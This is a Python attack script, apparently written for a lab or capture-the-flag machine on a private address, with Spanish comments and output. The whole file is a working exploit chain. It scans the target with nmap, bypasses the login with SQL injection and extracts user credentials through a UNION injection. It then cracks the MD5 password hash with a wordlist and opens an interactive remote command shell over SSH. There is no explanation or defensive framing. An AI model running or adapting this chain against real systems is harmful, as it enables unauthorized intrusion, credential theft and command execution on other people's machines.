import nmap
import requests
import hashlib
from bs4 import BeautifulSoup
from pwn import *

def code_md5(cadena):
    md5 = hashlib.md5()

    md5.update(cadena.encode())

    return md5.hexdigest()

def force_brute_md5(hash_md5):

    #wordlist = open("/usr/share/wordlists/rockyou.txt", r)

    wordlist = open('test', 'r')

    lines = wordlist.readlines()

    for password in lines:
        if hash_md5 == code_md5(password.strip()):
            return password.strip()    


nm = nmap.PortScanner()

ip_victima = '192.168.232.135' #/24

nm.scan(ip_victima, '1-1000', '-sS -n --min-rate=5000')

for host in nm.all_hosts():
    if 22 in nm[host]['tcp'].keys() and 80 in nm[host]['tcp'].keys():
        print("Host {} tiene los puertos 22, 80".format(host, ))
        
        nm_scan = nmap.PortScanner()

        nm_scan.scan(host, "22", "-sV -sC")

        ssh_scan = nm_scan[host]['tcp'][22]
        # 'state': 'open', 'reason': 'syn-ack', 'name': 'ssh', 'product': 'OpenSSH', 
        # 'version': '8.2p1 Ubuntu 4ubuntu0.5', 'extrainfo': 'Ubuntu Linux; protocol 2.0',
        #  'conf': '10', 'cpe': 'cpe:/o:linux:linux_kernel'}

        print("[+] Puerto 22")

        print("Nombre Aplicacion:", ssh_scan['name'])
        print("Nombre Servicio:", ssh_scan['product'])
        print("Version:", ssh_scan['version'])
        print("Informacion extra:", ssh_scan['extrainfo'])

        nm_scan.scan(host, "80", "-sV -sC")

        http_scan = nm_scan[host]['tcp'][80]

        print("[+] Puerto 80")

        print("Nombre Aplicacion:", http_scan['name'])
        print("Nombre Servicio:", http_scan['product'])
        print("Version:", http_scan['version'])
        print("Informacion extra:", http_scan['extrainfo'])
    

        sql_bypass = "1' OR 1=1-- -"

        data = {'username': sql_bypass, 'password': 'nhghgjerbhgre'}

        r = requests.post('http://192.168.232.135/login.php', data=data, allow_redirects=False)

        php_sseid = r.headers['Set-Cookie'].split('=')[1]

        headers = {
            'PHPSESSID': php_sseid
        }

        sql_injection = "1' UNION SELECT CONCAT(id, ' ', username, ' ', password),null,null FROM USERS-- -"

        data = {
            'nombre_autor': sql_injection
        }

        r = requests.post('http://192.168.232.135/profile.php', headers=headers, data=data)

        soup = BeautifulSoup(r.content, "html.parser")

        elements_th = soup.find_all("th")

        coded_hash_md5 = elements_th[3].text.strip().split(' ')[2]

        username = elements_th[3].text.strip().split(' ')[1]

        password = force_brute_md5(coded_hash_md5)


        s1 = ssh(host=host, user=username, password=password)
        try:
            while True:
                cmd = input("$> ")

                print(s1.run(cmd).recv().decode())

            #s1.close()
        except:
            s1.close()